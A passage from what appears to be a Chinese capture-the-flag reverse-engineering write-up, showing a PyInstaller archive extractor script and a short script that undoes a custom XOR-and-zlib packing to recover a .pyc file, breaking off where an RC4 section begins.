python"><span class="hljs-keyword">from</span> __future__ <span class="hljs-keyword">import</span> print_function<br><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> struct<br><span class="hljs-keyword">import</span> marshal<br><span class="hljs-keyword">import</span> zlib<br><span class="hljs-keyword">import</span> sys<br><span class="hljs-keyword">from</span> uuid <span class="hljs-keyword">import</span> uuid4 <span class="hljs-keyword">as</span> uniquename<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">CTOCEntry</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, position, cmprsdDataSize, uncmprsdDataSize, cmprsFlag, typeCmprsData, name</span>):<br>        <span class="hljs-variable language_">self</span>.position = position<br>        <span class="hljs-variable language_">self</span>.cmprsdDataSize = cmprsdDataSize<br>        <span class="hljs-variable language_">self</span>.uncmprsdDataSize = uncmprsdDataSize<br>        <span class="hljs-variable language_">self</span>.cmprsFlag = cmprsFlag<br>        <span class="hljs-variable language_">self</span>.typeCmprsData = typeCmprsData<br>        <span class="hljs-variable language_">self</span>.name = name<br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">PyInstArchive</span>:<br>    PYINST20_COOKIE_SIZE = <span class="hljs-number">24</span><br>    PYINST21_COOKIE_SIZE = <span class="hljs-number">24</span> + <span class="hljs-number">64</span><br>    MAGIC = <span class="hljs-string">b&#x27;MEI\014\013\012\013\016&#x27;</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, path</span>):<br>        <span class="hljs-variable language_">self</span>.filePath = path<br>        <span class="hljs-variable language_">self</span>.pycMagic = <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span><br>        <span class="hljs-variable language_">self</span>.barePycList = []<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">open</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-variable language_">self</span>.fPtr = <span class="hljs-built_in">open</span>(<span class="hljs-variable language_">self</span>.filePath, <span class="hljs-string">&#x27;rb&#x27;</span>)<br>            <span class="hljs-variable language_">self</span>.fileSize = os.stat(<span class="hljs-variable language_">self</span>.filePath).st_size<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Error: Could not open &#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-variable language_">self</span>.filePath))<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">close</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-variable language_">self</span>.fPtr.close()<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">pass</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">checkFile</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Processing &#123;0&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-variable language_">self</span>.filePath))<br>        searchChunkSize = <span class="hljs-number">8192</span><br>        endPos = <span class="hljs-variable language_">self</span>.fileSize<br>        <span class="hljs-variable language_">self</span>.cookiePos = -<span class="hljs-number">1</span><br><br>        <span class="hljs-keyword">if</span> endPos &lt; <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.MAGIC):<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Error : File is too short or truncated&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>            startPos = endPos - searchChunkSize <span class="hljs-keyword">if</span> endPos &gt;= searchChunkSize <span class="hljs-keyword">else</span> <span class="hljs-number">0</span><br>            chunkSize = endPos - startPos<br><br>            <span class="hljs-keyword">if</span> chunkSize &lt; <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.MAGIC):<br>                <span class="hljs-keyword">break</span><br><br>            <span class="hljs-variable language_">self</span>.fPtr.seek(startPos, os.SEEK_SET)<br>            data = <span class="hljs-variable language_">self</span>.fPtr.read(chunkSize)<br>            offs = data.rfind(<span class="hljs-variable language_">self</span>.MAGIC)<br><br>            <span class="hljs-keyword">if</span> offs != -<span class="hljs-number">1</span>:<br>                <span class="hljs-variable language_">self</span>.cookiePos = startPos + offs<br>                <span class="hljs-keyword">break</span><br><br>            endPos = startPos + <span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.MAGIC) - <span class="hljs-number">1</span><br>            <span class="hljs-keyword">if</span> startPos == <span class="hljs-number">0</span>:<br>                <span class="hljs-keyword">break</span><br><br>        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.cookiePos == -<span class="hljs-number">1</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Error : Missing cookie, unsupported pyinstaller version or not a pyinstaller archive&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        <span class="hljs-variable language_">self</span>.fPtr.seek(<span class="hljs-variable language_">self</span>.cookiePos + <span class="hljs-variable language_">self</span>.PYINST20_COOKIE_SIZE, os.SEEK_SET)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">b&#x27;python&#x27;</span> <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.fPtr.read(<span class="hljs-number">64</span>).lower():<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Pyinstaller version: 2.1+&#x27;</span>)<br>            <span class="hljs-variable language_">self</span>.pyinstVer = <span class="hljs-number">21</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-variable language_">self</span>.pyinstVer = <span class="hljs-number">20</span><br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Pyinstaller version: 2.0&#x27;</span>)<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">getCArchiveInfo</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pyinstVer == <span class="hljs-number">20</span>:<br>                <span class="hljs-variable language_">self</span>.fPtr.seek(<span class="hljs-variable language_">self</span>.cookiePos, os.SEEK_SET)<br>                (magic, lengthofPackage, toc, tocLen, pyver) = struct.unpack(<span class="hljs-string">&#x27;!8siiii&#x27;</span>, <span class="hljs-variable language_">self</span>.fPtr.read(<span class="hljs-variable language_">self</span>.PYINST20_COOKIE_SIZE))<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-variable language_">self</span>.fPtr.seek(<span class="hljs-variable language_">self</span>.cookiePos, os.SEEK_SET)<br>                (magic, lengthofPackage, toc, tocLen, pyver, pylibname) = struct.unpack(<span class="hljs-string">&#x27;!8sIIii64s&#x27;</span>, <span class="hljs-variable language_">self</span>.fPtr.read(<span class="hljs-variable language_">self</span>.PYINST21_COOKIE_SIZE))<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Error : The file is not a pyinstaller archive&#x27;</span>)<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br><br>        <span class="hljs-variable language_">self</span>.pymaj, <span class="hljs-variable language_">self</span>.pymin = (pyver//<span class="hljs-number">100</span>, pyver%<span class="hljs-number">100</span>) <span class="hljs-keyword">if</span> pyver &gt;= <span class="hljs-number">100</span> <span class="hljs-keyword">else</span> (pyver//<span class="hljs-number">10</span>, pyver%<span class="hljs-number">10</span>)<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Python version: &#123;0&#125;.&#123;1&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-variable language_">self</span>.pymaj, <span class="hljs-variable language_">self</span>.pymin))<br><br>        tailBytes = <span class="hljs-variable language_">self</span>.fileSize - <span class="hljs-variable language_">self</span>.cookiePos - (<span class="hljs-variable language_">self</span>.PYINST20_COOKIE_SIZE <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pyinstVer == <span class="hljs-number">20</span> <span class="hljs-keyword">else</span> <span class="hljs-variable language_">self</span>.PYINST21_COOKIE_SIZE)<br>        <span class="hljs-variable language_">self</span>.overlaySize = lengthofPackage + tailBytes<br>        <span class="hljs-variable language_">self</span>.overlayPos = <span class="hljs-variable language_">self</span>.fileSize - <span class="hljs-variable language_">self</span>.overlaySize<br>        <span class="hljs-variable language_">self</span>.tableOfContentsPos = <span class="hljs-variable language_">self</span>.overlayPos + toc<br>        <span class="hljs-variable language_">self</span>.tableOfContentsSize = tocLen<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Length of package: &#123;0&#125; bytes&#x27;</span>.<span class="hljs-built_in">format</span>(lengthofPackage))<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">parseTOC</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-variable language_">self</span>.fPtr.seek(<span class="hljs-variable language_">self</span>.tableOfContentsPos, os.SEEK_SET)<br>        <span class="hljs-variable language_">self</span>.tocList = []<br>        parsedLen = <span class="hljs-number">0</span><br><br>        <span class="hljs-keyword">while</span> parsedLen &lt; <span class="hljs-variable language_">self</span>.tableOfContentsSize:<br>            (entrySize,) = struct.unpack(<span class="hljs-string">&#x27;!i&#x27;</span>, <span class="hljs-variable language_">self</span>.fPtr.read(<span class="hljs-number">4</span>))<br>            nameLen = struct.calcsize(<span class="hljs-string">&#x27;!iIIIBc&#x27;</span>)<br>            (entryPos, cmprsdDataSize, uncmprsdDataSize, cmprsFlag, typeCmprsData, name) = \<br>                struct.unpack(<span class="hljs-string">&#x27;!IIIBc&#123;0&#125;s&#x27;</span>.<span class="hljs-built_in">format</span>(entrySize - nameLen), <span class="hljs-variable language_">self</span>.fPtr.read(entrySize - <span class="hljs-number">4</span>))<br><br>            <span class="hljs-keyword">try</span>:<br>                name = name.decode(<span class="hljs-string">&quot;utf-8&quot;</span>).rstrip(<span class="hljs-string">&quot;\0&quot;</span>)<br>            <span class="hljs-keyword">except</span> UnicodeDecodeError:<br>                name = <span class="hljs-built_in">str</span>(uniquename())<br><br>            <span class="hljs-keyword">if</span> name.startswith(<span class="hljs-string">&quot;/&quot;</span>):<br>                name = name.lstrip(<span class="hljs-string">&quot;/&quot;</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(name) == <span class="hljs-number">0</span>:<br>                name = <span class="hljs-built_in">str</span>(uniquename())<br><br>            <span class="hljs-variable language_">self</span>.tocList.append(CTOCEntry(<span class="hljs-variable language_">self</span>.overlayPos + entryPos, cmprsdDataSize, uncmprsdDataSize, cmprsFlag, typeCmprsData, name))<br>            parsedLen += entrySize<br><br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Found &#123;0&#125; files in CArchive&#x27;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">len</span>(<span class="hljs-variable language_">self</span>.tocList)))<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_writeRawData</span>(<span class="hljs-params">self, filepath, data</span>):<br>        nm = filepath.replace(<span class="hljs-string">&#x27;\\&#x27;</span>, os.path.sep).replace(<span class="hljs-string">&#x27;/&#x27;</span>, os.path.sep).replace(<span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;__&#x27;</span>)<br>        nmDir = os.path.dirname(nm)<br>        <span class="hljs-keyword">if</span> nmDir != <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> os.path.exists(nmDir):<br>            os.makedirs(nmDir)<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(nm, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            f.write(data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_writePyc</span>(<span class="hljs-params">self, filename, data</span>):<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(filename, <span class="hljs-string">&#x27;wb&#x27;</span>) <span class="hljs-keyword">as</span> pycFile:<br>            pycFile.write(<span class="hljs-variable language_">self</span>.pycMagic)<br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pymaj &gt;= <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> <span class="hljs-variable language_">self</span>.pymin &gt;= <span class="hljs-number">7</span>:<br>                pycFile.write(<span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>)<br>                pycFile.write(<span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">8</span>)<br>            <span class="hljs-keyword">else</span>:<br>                pycFile.write(<span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>)<br>                <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pymaj &gt;= <span class="hljs-number">3</span> <span class="hljs-keyword">and</span> <span class="hljs-variable language_">self</span>.pymin &gt;= <span class="hljs-number">3</span>:<br>                    pycFile.write(<span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>)<br>            pycFile.write(data)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_fixBarePycs</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-keyword">for</span> pycFile <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.barePycList:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(pycFile, <span class="hljs-string">&#x27;r+b&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>                f.write(<span class="hljs-variable language_">self</span>.pycMagic)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">extractFiles</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Beginning extraction...please standby&#x27;</span>)<br>        extractionDir = os.path.join(os.getcwd(), os.path.basename(<span class="hljs-variable language_">self</span>.filePath) + <span class="hljs-string">&#x27;_extracted&#x27;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(extractionDir):<br>            os.mkdir(extractionDir)<br>        os.chdir(extractionDir)<br><br>        <span class="hljs-keyword">for</span> entry <span class="hljs-keyword">in</span> <span class="hljs-variable language_">self</span>.tocList:<br>            <span class="hljs-variable language_">self</span>.fPtr.seek(entry.position, os.SEEK_SET)<br>            data = <span class="hljs-variable language_">self</span>.fPtr.read(entry.cmprsdDataSize)<br><br>            <span class="hljs-keyword">if</span> entry.cmprsFlag == <span class="hljs-number">1</span>:<br>                <span class="hljs-keyword">try</span>:<br>                    data = zlib.decompress(data)<br>                    <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(data) == entry.uncmprsdDataSize<br>                <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Error decompressing &#123;0&#125;, saving raw. Reason: &#123;1&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(entry.name, e))<br>                    <span class="hljs-variable language_">self</span>._writeRawData(entry.name + <span class="hljs-string">&quot;.raw&quot;</span>, data)<br>                    <span class="hljs-keyword">continue</span><br><br>            <span class="hljs-keyword">if</span> entry.typeCmprsData <span class="hljs-keyword">in</span> (<span class="hljs-string">b&#x27;d&#x27;</span>, <span class="hljs-string">b&#x27;o&#x27;</span>):<br>                <span class="hljs-keyword">continue</span><br><br>            basePath = os.path.dirname(entry.name)<br>            <span class="hljs-keyword">if</span> basePath != <span class="hljs-string">&#x27;&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> os.path.exists(basePath):<br>                os.makedirs(basePath)<br><br>            <span class="hljs-keyword">try</span>:<br>                <span class="hljs-keyword">if</span> entry.typeCmprsData == <span class="hljs-string">b&#x27;s&#x27;</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Possible entry point: &#123;0&#125;.pyc&#x27;</span>.<span class="hljs-built_in">format</span>(entry.name))<br>                    <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pycMagic == <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>:<br>                        <span class="hljs-variable language_">self</span>.barePycList.append(entry.name + <span class="hljs-string">&#x27;.pyc&#x27;</span>)<br>                    <span class="hljs-variable language_">self</span>._writePyc(entry.name + <span class="hljs-string">&#x27;.pyc&#x27;</span>, data)<br>                <span class="hljs-keyword">elif</span> entry.typeCmprsData <span class="hljs-keyword">in</span> (<span class="hljs-string">b&#x27;M&#x27;</span>, <span class="hljs-string">b&#x27;m&#x27;</span>):<br>                    <span class="hljs-keyword">if</span> data[<span class="hljs-number">2</span>:<span class="hljs-number">4</span>] == <span class="hljs-string">b&#x27;\r\n&#x27;</span>:<br>                        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pycMagic == <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>:<br>                            <span class="hljs-variable language_">self</span>.pycMagic = data[<span class="hljs-number">0</span>:<span class="hljs-number">4</span>]<br>                        <span class="hljs-variable language_">self</span>._writeRawData(entry.name + <span class="hljs-string">&#x27;.pyc&#x27;</span>, data)<br>                    <span class="hljs-keyword">else</span>:<br>                        <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pycMagic == <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>:<br>                            <span class="hljs-variable language_">self</span>.barePycList.append(entry.name + <span class="hljs-string">&#x27;.pyc&#x27;</span>)<br>                        <span class="hljs-variable language_">self</span>._writePyc(entry.name + <span class="hljs-string">&#x27;.pyc&#x27;</span>, data)<br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-variable language_">self</span>._writeRawData(entry.name, data)<br>                    <span class="hljs-keyword">if</span> entry.typeCmprsData <span class="hljs-keyword">in</span> (<span class="hljs-string">b&#x27;z&#x27;</span>, <span class="hljs-string">b&#x27;Z&#x27;</span>):<br>                        <span class="hljs-variable language_">self</span>._extractPyz(entry.name)<br>            <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Failed to write &#123;0&#125;, saving raw. Reason: &#123;1&#125;&#x27;</span>.<span class="hljs-built_in">format</span>(entry.name, e))<br>                <span class="hljs-variable language_">self</span>._writeRawData(entry.name + <span class="hljs-string">&quot;.raw&quot;</span>, data)<br><br>        <span class="hljs-variable language_">self</span>._fixBarePycs()<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_extractPyz</span>(<span class="hljs-params">self, name</span>):<br>        dirName = name + <span class="hljs-string">&#x27;_extracted&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(dirName):<br>            os.mkdir(dirName)<br><br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(name, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>            pyzMagic = f.read(<span class="hljs-number">4</span>)<br>            <span class="hljs-keyword">if</span> pyzMagic != <span class="hljs-string">b&#x27;PYZ\0&#x27;</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Not a valid PYZ, saving raw&#x27;</span>)<br>                <span class="hljs-variable language_">self</span>._writeRawData(name + <span class="hljs-string">&quot;.raw&quot;</span>, pyzMagic + f.read())<br>                <span class="hljs-keyword">return</span><br><br>            pyzPycMagic = f.read(<span class="hljs-number">4</span>)<br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pycMagic == <span class="hljs-string">b&#x27;\0&#x27;</span> * <span class="hljs-number">4</span>:<br>                <span class="hljs-variable language_">self</span>.pycMagic = pyzPycMagic<br>            <span class="hljs-keyword">elif</span> <span class="hljs-variable language_">self</span>.pycMagic != pyzPycMagic:<br>                <span class="hljs-variable language_">self</span>.pycMagic = pyzPycMagic<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Warning: pyc magic changed inside PYZ&#x27;</span>)<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-variable language_">self</span>.pymaj != sys.version_info.major <span class="hljs-keyword">or</span> <span class="hljs-variable language_">self</span>.pymin != sys.version_info.minor:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Python version mismatch, skipping PYZ extraction&#x27;</span>)<br>                <span class="hljs-variable language_">self</span>._writeRawData(name + <span class="hljs-string">&quot;.raw&quot;</span>, f.read())<br>                <span class="hljs-keyword">return</span><br><br>            <span class="hljs-keyword">try</span>:<br>                (tocPosition,) = struct.unpack(<span class="hljs-string">&#x27;!i&#x27;</span>, f.read(<span class="hljs-number">4</span>))<br>                f.seek(tocPosition, os.SEEK_SET)<br>                toc = marshal.load(f)<br>            <span class="hljs-keyword">except</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Unmarshalling failed, saving raw PYZ&#x27;</span>)<br>                f.seek(<span class="hljs-number">0</span>)<br>                <span class="hljs-variable language_">self</span>._writeRawData(name + <span class="hljs-string">&quot;.raw&quot;</span>, f.read())<br>                <span class="hljs-keyword">return</span><br><br>            <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(toc, <span class="hljs-built_in">list</span>):<br>                toc = <span class="hljs-built_in">dict</span>(toc)<br><br>            <span class="hljs-keyword">for</span> key <span class="hljs-keyword">in</span> toc.keys():<br>                ispkg, pos, length = toc[key]<br>                f.seek(pos, os.SEEK_SET)<br>                fileName = key<br>                <span class="hljs-keyword">try</span>:<br>                    fileName = fileName.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-keyword">pass</span><br>                fileName = fileName.replace(<span class="hljs-string">&#x27;..&#x27;</span>, <span class="hljs-string">&#x27;__&#x27;</span>).replace(<span class="hljs-string">&#x27;.&#x27;</span>, os.path.sep)<br>                <span class="hljs-keyword">if</span> ispkg == <span class="hljs-number">1</span>:<br>                    filePath = os.path.join(dirName, fileName, <span class="hljs-string">&#x27;__init__.pyc&#x27;</span>)<br>                <span class="hljs-keyword">else</span>:<br>                    filePath = os.path.join(dirName, fileName + <span class="hljs-string">&#x27;.pyc&#x27;</span>)<br>                fileDir = os.path.dirname(filePath)<br>                <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(fileDir):<br>                    os.makedirs(fileDir)<br>                <span class="hljs-keyword">try</span>:<br>                    data = f.read(length)<br>                    data = zlib.decompress(data)<br>                    <span class="hljs-variable language_">self</span>._writePyc(filePath, data)<br>                <span class="hljs-keyword">except</span>:<br>                    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[!] Error decompressing &#123;0&#125;, saving raw&#x27;</span>.<span class="hljs-built_in">format</span>(filePath))<br>                    <span class="hljs-variable language_">self</span>._writeRawData(filePath + <span class="hljs-string">&quot;.raw&quot;</span>, data)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(sys.argv) &lt; <span class="hljs-number">2</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Usage: python exp.py &lt;filename&gt;&#x27;</span>)<br>        <span class="hljs-keyword">return</span><br><br>    arch = PyInstArchive(sys.argv[<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> arch.<span class="hljs-built_in">open</span>():<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> arch.checkFile():<br>        arch.close()<br>        <span class="hljs-keyword">return</span><br>    <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> arch.getCArchiveInfo():<br>        arch.close()<br>        <span class="hljs-keyword">return</span><br>    arch.parseTOC()<br>    arch.extractFiles()<br>    arch.close()<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[+] Extraction finished. Check the &quot;_extracted&quot; folder for files.&#x27;</span>)<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>    main()<br></code></pre></td></tr></table></figure><p>提取出来的.raw文件就是没有解包成功部分的初始内容</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508261242748.png" alt="img"></p><p>用ida看exe文件的加密方式，sub_1400011F0函数里就是魔改的地方</p><p>解密过程：检查开头“swdd”，去除头， 每 16 字节用 <code>key[j] = 0xAA</code> 异或 ，剩余的逐字节xor， 最后zlib解压</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508261242154.png" alt="img"></p><p>脚本提取先前提取出为解包的CreackMe&amp;&amp;FxxMe.raw文件处理得到pyc文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> zlib<br><br>key_16 = <span class="hljs-built_in">bytes</span>([<span class="hljs-number">0xAA</span>]*<span class="hljs-number">16</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt_raw</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>    <span class="hljs-comment"># 检查是否有 &#x27;swdd&#x27; 头</span><br>    <span class="hljs-keyword">if</span> data.startswith(<span class="hljs-string">b&#x27;swdd&#x27;</span>):<br>        enc = data[<span class="hljs-number">4</span>:]<br>    <span class="hljs-keyword">else</span>:<br>        enc = data<br><br>    dec = <span class="hljs-built_in">bytearray</span>()<br>    length = <span class="hljs-built_in">len</span>(enc)<br>    i = <span class="hljs-number">0</span><br><br><br>    <span class="hljs-keyword">while</span> i + <span class="hljs-number">16</span> &lt;= length:<br>        block = enc[i:i+<span class="hljs-number">16</span>]<br>        dec.extend(<span class="hljs-built_in">bytes</span>([block[j] ^ key_16[j] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">16</span>)]))<br>        i += <span class="hljs-number">16</span><br><br>    <span class="hljs-keyword">while</span> i &lt; length:<br>        dec.append(enc[i] ^ <span class="hljs-number">0xAA</span>)<br>        i += <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> zlib.decompress(dec)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    raw_file = <span class="hljs-string">&quot;CreackMe&amp;&amp;FxxMe.raw&quot;</span><br>    pyc_file = <span class="hljs-string">&quot;CreackMe&amp;&amp;FxxMe.pyc&quot;</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(raw_file, <span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        raw_data = f.read()<br><br>    decrypted_data = decrypt_raw(raw_data)<br><br>    pyc_header = <span class="hljs-string">b&#x27;\x55\x0d\x0d\x0a&#x27;</span> + <span class="hljs-string">b&#x27;\x00&#x27;</span>*<span class="hljs-number">12</span><br><br>    <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(pyc_file, <span class="hljs-string">&quot;wb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>        f.write(pyc_header)<br>        f.write(decrypted_data)<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;[+] 解密完成，生成 <span class="hljs-subst">&#123;pyc_file&#125;</span>&quot;</span>)<br></code></pre></td></tr></table></figure><p>反编译得到主要加密内容</p><p><img src="https://cdn.jsdelivr.net/gh/J1NXEM/image@image/image/202508261242502.png" alt="img"></p><p>rc4加密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td 